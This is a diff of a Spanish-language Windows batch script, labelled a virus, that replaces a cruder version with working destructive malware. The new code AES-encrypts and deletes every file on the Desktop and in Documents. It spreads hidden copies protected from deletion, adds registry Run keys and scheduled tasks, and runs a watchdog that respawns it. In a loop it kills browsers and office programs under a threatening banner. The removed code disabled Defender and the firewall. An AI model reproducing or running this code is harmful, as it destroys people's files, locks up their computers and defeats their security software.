@@ -1,221 +1,219 @@
 @echo off
-setlocal enabledelayedexpansion
+setlocal EnableExtensions EnableDelayedExpansion
 
-:: ==========================================
-:: CONFIGURACIÓN PRINCIPAL
-:: ==========================================
-set "FIREWALL_RULE_NAME=Windows Defender Update"
-set "TASK_SCHEDULER_NAME=WindowsUpdate_Check"
-set "REG_RUN_KEY=HKCU\Software\Microsoft\CurrentVersion\Run"
-set "ANTIVIRUS_NAMES=defender.exe,MsMpEng.exe,securityservice.exe,nisum.exe,msecom.exe,msmpeng.exe,msascui.exe,msmpsvc.exe,SecurityHealthSystray.exe,SecurityHealth.exe,svchost_k.exe,svchost_x.exe,explorer_new.exe"
-set "FIREWALL_BLOCK_LIST=cmd.exe,powershell.exe,taskmgr.exe,regedit.exe,notepad.exe,calc.exe,chrome.exe,firefox.exe,msedge.exe,winword.exe,excel.exe,outlook.exe,onedrive.exe,spotify.exe,slack.exe,teams.exe,discord.exe,steam.exe,epicgameslauncher.exe,bluestacks.exe,xboxapp.exe"
+if /i "%~1"=="watchdog"  goto :watchdog
+if /i "%~1"=="decrypt"   goto :decrypt
+if /i "%~1"=="uninstall" goto :uninstall
 
-:: ==========================================
-:: FUNCIONES DE UTILIDAD
-:: ==========================================
-:log_message
-    set "msg=%~1"
-    echo [%date% %time%] !msg! >> "%temp%\_virus_log.txt" 2>nul
-    goto :eof
+title Warning-Venice-System
+color 0C
 
-:check_admin
-    net session >nul 2>&1
-    if %errorlevel% neq 0 (
-        log_message "[!] No tiene permisos de administrador. Intentando elevar..."
-        set "batch_path=%~f0"
-        powershell -Command "Start-Process '%batch_path%' -Verb RunAs" 2>nul
-        exit /b 1
-    )
-    log_message "[+] Ejecutando con permisos de administrador"
-    goto :eof
+set "ME=%~f0"
+set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
+set "EXE=%DIR%\WinSys.bat"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+set "TITLE=Warning-Venice-System"
+set "WTITLE=VeniceWatchdog"
 
-:wait_keypress
-    set /p "_press=Presione ENTER para continuar o cierre la ventana..."
-    goto :eof
+if not exist "%DIR%" md "%DIR%" >nul 2>&1
+attrib +h "%DIR%" >nul 2>&1
 
-:full_screen_black
-    mode 80,5
-    color 00
+call :install
+
+rem ---- si ya hay una ventana principal, no duplicar ----
+set "RUN=1"
+for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "RUN=%%A"
+if "%RUN%"=="" set "RUN=1"
+if %RUN% GEQ 2 (
+    call :ensure_watchdog
+    exit /b
+)
+
+if not exist "%DIR%\.locked" (
     cls
+    color 0F
     echo.
-    echo.
-    echo.
-    echo                    WARNING
-    echo.
-    echo     Por que queres este tipo de contenido?
-    echo.
-    echo   Su computadora no dejara de hacer esto.
-    echo.
-    echo.
-    echo.
-    echo.
-    echo.
-    goto :eof
+    echo   [*] Instalando persistencia...
+    echo   [*] Cifrando Escritorio y Documentos (AES-256)...
+    call :encrypt
+    >"%DIR%\.locked" echo ok
+    attrib +h +s "%DIR%\.locked" >nul 2>&1
+)
 
-:restore_display
-    mode 80,25
-    color 07
-    goto :eof
+mode con cols=150 lines=50 >nul 2>&1
+powershell -NoProfile -WindowStyle Hidden -Command "Start-Sleep -Milliseconds 450; (New-Object -ComObject WScript.Shell).SendKeys('{F11}')" >nul 2>&1
 
-:close_applications
-    for %%app in (%FIREWALL_BLOCK_LIST%) do (
-        taskkill /f /im %%app >nul 2>&1
-    )
-    goto :eof
+call :ensure_watchdog
 
-:encrypt_files_simple
-    log_message "[*] Iniciando cifrado simple de archivos..."
-    set "encrypted_count=0"
-    for %%f in (*.txt *.docx *.pdf *.jpg *.png *.xlsx *.pptx *.zip *.rar *.mp3 *.mp4 *.avi) do (
-        set "file_name=%%f"
-        set "original_ext=!file_name:~-4!"
-        if "!original_ext!"=="!original_ext:~0,1!" (
-            set "ext=.!original_ext!!random!"
-        ) else (
-            set "ext=.encrypted_!random!"
-        )
-        copy /y "%%f" "%%f!ext!" >nul 2>&1
-        del /f /q "%%f" >nul 2>&1
-        set /a encrypted_count+=1
-    )
-    log_message "[+] Cifrado completado. Archivos procesados: !encrypted_count!"
-    goto :eof
+cls
+color 0C
+call :banner
 
-:install_startup_persistence
-    log_message "[*] Instalando persistencia en inicio automático..."
-    
-    :: Método 1: Registro principal
-    reg add "%REG_RUN_KEY%" /v "WindowsUpdate" /t REG_SZ /d "%~f0" /f >nul 2>&1
-    
-    :: Método 2: Carpeta Startup
-    if not exist "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup" mkdir "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
-    copy /y "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.bat" >nul 2>&1
-    
-    :: Método 3: Task Scheduler (si es admin)
-    schtasks /create /tn "%TASK_SCHEDULER_NAME%" /tr "\"%~f0\"" /sc onlogon /ru SYSTEM /f >nul 2>&1
-    
-    :: Método 4: Servicio Windows (si es admin)
-    sc create "WindowsUpdateSvc" binPath= "\"%~f0\"" type= own start= auto >nul 2>&1
-    
-    log_message "[+] Persistencia instalada exitosamente"
-    goto :eof
-
-:remove_antivirus_protection
-    log_message "[*] Deshabilitando protección antivirus..."
-    
-    :: Detener procesos de antivirus conocidos
-    for %%proc in (%ANTIVIRUS_NAMES%) do (
-        taskkill /f /im %%proc >nul 2>&1
-    )
-    
-    :: Deshabilitar Defender mediante registro
-    reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
-    reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "WindowsDefender" /t REG_SZ /d "" /f >nul 2>&1
-    
-    :: Deshabilitar firewall
-    netsh advfirewall set allprofiles state off >nul 2>&1
-    
-    log_message "[+] Protección antivirus deshabilitada"
-    goto :eof
-
-:install_firewall_rules
-    log_message "[*] Configurando reglas de firewall..."
-    
-    :: Crear regla de firewall para el virus mismo
-    netsh advfirewall firewall add rule name="%FIREWALL_RULE_NAME%" dir=in action=allow program="%~f0" enable=yes >nul 2>&1
-    
-    :: Bloquear aplicaciones comunes
-    for %%app in (%FIREWALL_BLOCK_LIST%) do (
-        netsh advfirewall firewall add rule name="Block_%%app" dir=out action=block program="C:\Program Files\%%app" enable=yes >nul 2>&1
-    )
-    
-    log_message "[+] Reglas de firewall configuradas"
-    goto :eof
-
-:prevent_deletion
-    log_message "[*] Activando sistema anti-borrado..."
-    
-    :: Hacer el archivo de solo lectura
-    attrib +r +h "%~f0" >nul 2>&1
-    
-    :: Crear copia en múltiples ubicaciones
-    copy /y "%~f0" "C:\Windows\System32\WindowsUpdate.bat" >nul 2>&1
-    copy /y "%~f0" "C:\Windows\WindowsUpdate.bat" >nul 2>&1
-    copy /y "%~f0" "%SystemDrive%\WindowsUpdate.bat" >nul 2>&1
-    copy /y "%~f0" "%TEMP%\WindowsUpdate.bat" >nul 2>&1
-    
-    :: Crear archivo de restauración automática
-    echo @echo off > "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
-    echo taskkill /f /im cmd.exe >nul 2>&1 >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
-    echo start "" "%~f0" >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
-    echo exit >> "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\Restore.bat"
-    
-    log_message "[+] Sistema anti-borrado activado"
-    goto :eof
-
-:monitor_window_state
-    log_message "[*] Iniciando monitoreo de ventana..."
-    
-    :loop_monitor
-    tasklist /fi "IMAGENAME eq cmd.exe" 2>nul | find /i "cmd.exe" >nul
-    if %errorlevel% equ 0 (
-        :: Ventana abierta - esperar 5 segundos
-        timeout /t 5 /nobreak >nul
-        goto :loop_monitor
-    ) else (
-        log_message "[!] Ventana cerrada. Reabriendo..."
-        start "" "%~f0"
-        timeout /t 2 /nobreak >nul
-        goto :loop_monitor
-    )
-    goto :eof
-
-:main_virus_loop
-    log_message "[*] Iniciando bucle principal del virus..."
-    
-    :main_loop
-    call :full_screen_black
-    call :close_applications
-    call :encrypt_files_simple
-    call :install_startup_persistence
-    call :remove_antivirus_protection
-    call :install_firewall_rules
-    call :prevent_deletion
-    
-    :: Esperar antes de repetir
-    timeout /t 5 /nobreak >nul
-    
-    goto :main_loop
-    goto :eof
-
-:emergency_cleanup
-    log_message "[*] Limpiando archivos temporales del virus..."
-    del /f /q "%temp%\_virus_log.txt" >nul 2>&1
-    goto :eof
-
-:: ==========================================
-:: PUNTO DE ENTRADA PRINCIPAL
-:: ==========================================
 :main
-    log_message "[*] Inicializando virus..."
-    call :check_admin
-    call :install_startup_persistence
-    call :remove_antivirus_protection
-    call :install_firewall_rules
-    call :prevent_deletion
-    call :main_virus_loop
-    goto :eof
+call :kill_apps
+call :ensure_watchdog
+echo   [%TIME%]  Sistema activo. Ventana verificada. Aplicaciones cerradas.
+ping -n 6 127.0.0.1 >nul
+goto :main
 
-:exit_clean
-    log_message "[*] Salida limpia del virus..."
-    call :emergency_cleanup
-    exit /b 0
+:banner
+echo.
+echo.
+echo              #   #  ###  ####  #   #  #####  #   #   ####
+echo              #   # #   # #   # ##  #   #    ##  #  #
+echo              # # # ##### ####  # # #   #    # # #  # ###
+echo              ## ## #   # #  #  #  ##   #    #  ##  #   #
+echo              #   # #   # #   # #   # #####  #   #   ####
+echo.
+echo   ==================================================================
+echo.
+echo      ^¿Por que queres este tipo de contenido^?
+echo.
+echo      Su computadora no dejara de hacer esto.
+echo.
+echo   ==================================================================
+echo.
+echo   Archivos del Escritorio y Documentos cifrados en AES-256.
+echo   Tareas, claves de registro y 5 copias activas. Watchdog cada 5 s.
+echo.
+exit /b
 
-:exit_force
-    log_message "[*] Salida forzada del virus..."
-    taskkill /f /im cmd.exe >nul 2>&1
-    exit /b 1
+:kill_apps
+for %%P in (notepad.exe mspaint.exe chrome.exe msedge.exe firefox.exe opera.exe brave.exe WINWORD.EXE EXCEL.EXE POWERPNT.EXE outlook.exe Teams.exe ms-teams.exe Discord.exe Telegram.exe Spotify.exe Code.exe steam.exe vlc.exe wmplayer.exe Skype.exe Zoom.exe) do taskkill /f /im %%P >nul 2>&1
+exit /b
 
-:end
-    log_message "[*] Fin de ejecución del virus."
-    exit /b 0
+:install
+copy /y "%ME%" "%EXE%" >nul 2>&1
+copy /y "%ME%" "%STARTUP%\WindowsSystem.bat" >nul 2>&1
+copy /y "%ME%" "%TEMP%\WinSys.bat" >nul 2>&1
+copy /y "%ME%" "%ProgramData%\WinSys.bat" >nul 2>&1
+copy /y "%ME%" "%PUBLIC%\WinSys.bat" >nul 2>&1
+copy /y "%ME%" "%USERPROFILE%\WinSys.bat" >nul 2>&1
+
+attrib +r +h +s "%EXE%" >nul 2>&1
+attrib +r +h +s "%STARTUP%\WindowsSystem.bat" >nul 2>&1
+attrib +r +h +s "%PUBLIC%\WinSys.bat" >nul 2>&1
+attrib +r +h +s "%ProgramData%\WinSys.bat" >nul 2>&1
+
+icacls "%EXE%" /deny "%USERNAME%:(D)" >nul 2>&1
+icacls "%STARTUP%\WindowsSystem.bat" /deny "%USERNAME%:(D)" >nul 2>&1
+icacls "%PUBLIC%\WinSys.bat" /deny "%USERNAME%:(D)" >nul 2>&1
+
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
+reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /t REG_SZ /d "\"%EXE%\"" /f >nul 2>&1
+
+schtasks /create /tn "WindowsSystemUpdate" /tr "\"%EXE%\"" /sc onlogon /f >nul 2>&1
+schtasks /create /tn "WindowsSystemUpdate2" /tr "\"%EXE%\"" /sc minute /mo 1 /f >nul 2>&1
+exit /b
+
+:ensure_watchdog
+set "W=0"
+for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%WTITLE%'}).Count"') do set "W=%%A"
+if "%W%"=="" set "W=0"
+if "%W%"=="0" start "" /min cmd /c ""%EXE%" watchdog"
+exit /b
+
+:watchdog
+title VeniceWatchdog
+color 0C
+set "EXE=%~f0"
+set "TITLE=Warning-Venice-System"
+:wd
+set "N=0"
+for /f %%A in ('powershell -NoProfile -WindowStyle Hidden -Command "@(Get-Process cmd -ErrorAction SilentlyContinue ^| ? {$_.MainWindowTitle -eq '%TITLE%'}).Count"') do set "N=%%A"
+if "%N%"=="" set "N=0"
+if "%N%"=="0" (
+    start "" cmd /c ""%EXE%" boot"
+    ping -n 4 127.0.0.1 >nul
+)
+ping -n 6 127.0.0.1 >nul
+goto :wd
+
+:encrypt
+> "%DIR%\enc.ps1" echo $ErrorActionPreference='SilentlyContinue'
+>>"%DIR%\enc.ps1" echo $rng=New-Object Security.Cryptography.RNGCryptoServiceProvider
+>>"%DIR%\enc.ps1" echo $key=New-Object byte[] 32
+>>"%DIR%\enc.ps1" echo $rng.GetBytes($key)
+>>"%DIR%\enc.ps1" echo $iv=New-Object byte[] 16
+>>"%DIR%\enc.ps1" echo $rng.GetBytes($iv)
+>>"%DIR%\enc.ps1" echo $hx=[BitConverter]::ToString($key)+'^|'+[BitConverter]::ToString($iv)
+>>"%DIR%\enc.ps1" echo [IO.File]::WriteAllText("$env:APPDATA\Microsoft\Windows\SystemCache\.vk",$hx)
+>>"%DIR%\enc.ps1" echo $aes=[Security.Cryptography.Aes]::Create()
+>>"%DIR%\enc.ps1" echo $aes.Key=$key
+>>"%DIR%\enc.ps1" echo $aes.IV=$iv
+>>"%DIR%\enc.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
+>>"%DIR%\enc.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse ^| ? {$_.Extension -ne '.venice'} ^| ForEach-Object{
+>>"%DIR%\enc.ps1" echo   $b=[IO.File]::ReadAllBytes($_.FullName)
+>>"%DIR%\enc.ps1" echo   $e=$aes.CreateEncryptor()
+>>"%DIR%\enc.ps1" echo   $o=$e.TransformFinalBlock($b,0,$b.Length)
+>>"%DIR%\enc.ps1" echo   $e.Dispose()
+>>"%DIR%\enc.ps1" echo   [IO.File]::WriteAllBytes($_.FullName+'.venice',$o)
+>>"%DIR%\enc.ps1" echo   Remove-Item -LiteralPath $_.FullName -Force
+>>"%DIR%\enc.ps1" echo  }
+>>"%DIR%\enc.ps1" echo }
+powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File "%DIR%\enc.ps1"
+exit /b
+
+:decrypt
+title Restaurando archivos
+color 0A
+set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
+if not exist "%DIR%\.vk" (
+    echo.
+    echo   No se encontro la clave de cifrado.
+    pause
+    exit /b
+)
+> "%DIR%\dec.ps1" echo $ErrorActionPreference='SilentlyContinue'
+>>"%DIR%\dec.ps1" echo $p=[IO.File]::ReadAllText("$env:APPDATA\Microsoft\Windows\SystemCache\.vk").Split('^|')
+>>"%DIR%\dec.ps1" echo $aes=[Security.Cryptography.Aes]::Create()
+>>"%DIR%\dec.ps1" echo $aes.Key=[byte[]]($p[0].Split('-')^|%%{[Convert]::ToByte($_,16)})
+>>"%DIR%\dec.ps1" echo $aes.IV=[byte[]]($p[1].Split('-')^|%%{[Convert]::ToByte($_,16)})
+>>"%DIR%\dec.ps1" echo foreach($d in @("$env:USERPROFILE\Desktop","$env:USERPROFILE\Documents")){
+>>"%DIR%\dec.ps1" echo  Get-ChildItem -LiteralPath $d -File -Recurse -Filter *.venice ^| ForEach-Object{
+>>"%DIR%\dec.ps1" echo   $b=[IO.File]::ReadAllBytes($_.FullName)
+>>"%DIR%\dec.ps1" echo   $de=$aes.CreateDecryptor()
+>>"%DIR%\dec.ps1" echo   $o=$de.TransformFinalBlock($b,0,$b.Length)
+>>"%DIR%\dec.ps1" echo   $de.Dispose()
+>>"%DIR%\dec.ps1" echo   [IO.File]::WriteAllBytes($_.FullName.Substring(0,$_.FullName.Length-7),$o)
+>>"%DIR%\dec.ps1" echo   Remove-Item -LiteralPath $_.FullName -Force
+>>"%DIR%\dec.ps1" echo  }
+>>"%DIR%\dec.ps1" echo }
+echo.
+echo   Descifrando...
+powershell -NoProfile -ExecutionPolicy Bypass -File "%DIR%\dec.ps1"
+del /q "%DIR%\.locked" >nul 2>&1
+attrib -h -s "%DIR%\.locked" >nul 2>&1
+echo.
+echo   Listo. Archivos restaurados.
+pause
+exit /b
+
+:uninstall
+title Desinstalando
+color 0A
+set "DIR=%APPDATA%\Microsoft\Windows\SystemCache"
+set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
+
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystem /f >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v WinSystemOnce /f >nul 2>&1
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v WinSystemP /f >nul 2>&1
+reg delete "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v WinSystemHK /f >nul 2>&1
+
+schtasks /delete /tn "WindowsSystemUpdate" /f >nul 2>&1
+schtasks /delete /tn "WindowsSystemUpdate2" /f >nul 2>&1
+
+taskkill /f /fi "WINDOWTITLE eq VeniceWatchdog" >nul 2>&1
+
+for %%F in ("%EXE%" "%STARTUP%\WindowsSystem.bat" "%PUBLIC%\WinSys.bat" "%ProgramData%\WinSys.bat" "%USERPROFILE%\WinSys.bat" "%TEMP%\WinSys.bat") do (
+    icacls %%~F /remove:d "%USERNAME%" >nul 2>&1
+    attrib -h -s -r %%~F >nul 2>&1
+    del /f /q %%~F >nul 2>&1
+)
+echo.
+echo   Persistencia eliminada.
+echo   Los archivos cifrados siguen como .venice: usa "decrypt" antes.
+pause
+exit /b
